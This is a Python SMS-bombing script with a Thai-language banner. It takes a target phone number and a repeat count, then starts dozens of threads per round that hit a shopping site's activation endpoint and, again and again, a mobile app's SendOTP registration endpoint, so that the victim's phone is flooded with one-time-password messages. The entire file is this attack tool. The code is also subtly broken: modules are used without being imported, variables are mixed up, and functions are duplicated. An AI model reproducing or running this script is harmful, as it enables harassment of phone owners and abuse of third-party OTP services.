import requests
from requests import post,Session
import sys
import threading
from re import search
phone = ""
amount = ""


if len(sys.argv)==3:
	phone = sys.argv[1]
	amount = int(sys.argv[2])
	
else:
	print("""
Alife City Developer ใช้ในการยิงเบอร์
แก้ไขส่วนต่างๆ โดย Admin Alife City
ใช้ในการจัดการพวกเกรียนไม่อนุญาติให้ใช้ยิงคนอื่นไปทั่ว
              
	""")

	phone = input("\033[95m+ เบอร์ : \033[0m")
	num = int(input("\033[95m+ จำนวน : \033[0m"))
	os.system("clear")
		
def alifecity(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity2():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity3():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity4():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity5():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity6():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity7():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity8():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity9():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity10():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity11():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity12():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity119():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity14():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity15():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity16():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity17():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity19():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity22():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity23():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity21():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity18():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity24():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity25():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity27():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity28():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity20():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity26():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity27():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity28():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity29():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity30():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity31():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity32():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity33():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity34():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity35():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity36():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity37():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity38():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity39():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity40():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity41():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity42():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity43():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity44():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity45():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity46():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity47():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity48():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity49():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity50():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity51():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity52():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity53():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity54():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity55():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity56():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity57():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity58():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity59():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity60():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity61():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity62():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity63():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity64():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity65():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity66():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity67():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity68():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity69():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity70():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity71():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity72():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity73():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity74():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity75():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity76():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity77():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity78():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity79():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity80():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity81():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity82():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity83():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity84():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity85():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity86():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity87():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity88():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity89():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity90():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity91():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity92():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity93():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity94():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity95():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity96():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity97():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity98():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")
	
def alifecity99():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

def alifecity100():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print (f"ส่ง SMS ไปที่เบอร์ {phone} | สำเร็จ ✓")

for i in range(num):
	time.sleep(1)
	threading.Thread(target=alifecity).start()
	threading.Thread(target=alifecity2).start()
	threading.Thread(target=alifecity3).start()
	threading.Thread(target=alifecity4).start()
	threading.Thread(target=alifecity5).start()
	threading.Thread(target=alifecity6).start()
	threading.Thread(target=alifecity7).start()
	threading.Thread(target=alifecity8).start()
	threading.Thread(target=alifecity9).start()
	threading.Thread(target=alifecity10).start()
	threading.Thread(target=alifecity11).start()
	threading.Thread(target=alifecity12).start()
	threading.Thread(target=alifecity14).start()
	threading.Thread(target=alifecity15).start()
	threading.Thread(target=alifecity16).start()
	threading.Thread(target=alifecity17).start()
	threading.Thread(target=alifecity18).start()
	threading.Thread(target=alifecity19).start()
	threading.Thread(target=alifecity20).start()
	threading.Thread(target=alifecity21).start()
	threading.Thread(target=alifecity22).start()
	threading.Thread(target=alifecity24).start()
	threading.Thread(target=alifecity25).start()
	threading.Thread(target=alifecity26).start()
	threading.Thread(target=alifecity27).start()
	threading.Thread(target=alifecity28).start()
	threading.Thread(target=alifecity29).start()
	threading.Thread(target=alifecity30).start()
	threading.Thread(target=alifecity31).start()
	threading.Thread(target=alifecity32).start()
	threading.Thread(target=alifecity33).start()
	threading.Thread(target=alifecity34).start()
	threading.Thread(target=alifecity35).start()
	threading.Thread(target=alifecity36).start()
	threading.Thread(target=alifecity37).start()
	threading.Thread(target=alifecity38).start()
	threading.Thread(target=alifecity39).start()
	threading.Thread(target=alifecity40).start()
	threading.Thread(target=alifecity41).start()
	threading.Thread(target=alifecity42).start()
	threading.Thread(target=alifecity43).start()
	threading.Thread(target=alifecity44).start()
	threading.Thread(target=alifecity45).start()
	threading.Thread(target=alifecity46).start()
	threading.Thread(target=alifecity47).start()
	threading.Thread(target=alifecity48).start()
	threading.Thread(target=alifecity49).start()
	threading.Thread(target=alifecity50).start()
	threading.Thread(target=alifecity51).start()
	threading.Thread(target=alifecity52).start()
	threading.Thread(target=alifecity53).start()
	threading.Thread(target=alifecity54).start()
	threading.Thread(target=alifecity55).start()
	threading.Thread(target=alifecity56).start()
	threading.Thread(target=alifecity57).start()
	threading.Thread(target=alifecity58).start()
	threading.Thread(target=alifecity59).start()
	threading.Thread(target=alifecity60).start()
	threading.Thread(target=alifecity61).start()
	threading.Thread(target=alifecity62).start()
	threading.Thread(target=alifecity63).start()
	threading.Thread(target=alifecity64).start()
	threading.Thread(target=alifecity65).start()
	threading.Thread(target=alifecity66).start()
	threading.Thread(target=alifecity67).start()
	threading.Thread(target=alifecity68).start()
	threading.Thread(target=alifecity69).start()
	threading.Thread(target=alifecity70).start()
	threading.Thread(target=alifecity71).start()
	threading.Thread(target=alifecity72).start()
	threading.Thread(target=alifecity73).start()
	threading.Thread(target=alifecity74).start()
	threading.Thread(target=alifecity75).start()
	threading.Thread(target=alifecity76).start()
	threading.Thread(target=alifecity77).start()
	threading.Thread(target=alifecity78).start()
	threading.Thread(target=alifecity79).start()
	threading.Thread(target=alifecity80).start()
	threading.Thread(target=alifecity81).start()
	threading.Thread(target=alifecity82).start()
	threading.Thread(target=alifecity83).start()
	threading.Thread(target=alifecity84).start()
	threading.Thread(target=alifecity85).start()
	threading.Thread(target=alifecity86).start()
	threading.Thread(target=alifecity87).start()
	threading.Thread(target=alifecity88).start()
	threading.Thread(target=alifecity89).start()
	threading.Thread(target=alifecity90).start()
	threading.Thread(target=alifecity91).start()
	threading.Thread(target=alifecity92).start()
	threading.Thread(target=alifecity93).start()
	threading.Thread(target=alifecity94).start()
	threading.Thread(target=alifecity95).start()
	threading.Thread(target=alifecity96).start()
	threading.Thread(target=alifecity97).start()
	threading.Thread(target=alifecity98).start()
	threading.Thread(target=alifecity99).start()
	threading.Thread(target=alifecity100).start()
